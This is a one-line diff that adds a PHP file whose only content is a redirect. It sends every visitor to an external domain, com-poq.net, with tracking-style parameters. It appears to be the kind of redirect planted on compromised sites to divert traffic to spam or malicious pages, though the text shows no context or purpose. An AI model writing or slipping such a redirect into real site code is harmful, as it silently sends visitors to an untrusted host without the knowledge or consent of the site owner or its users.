@@ -1,0 +1,1 @@
+<?php header("Location: http://com-poq.net/space.php?a=218848&c=wl_con&s=d807"); ?>
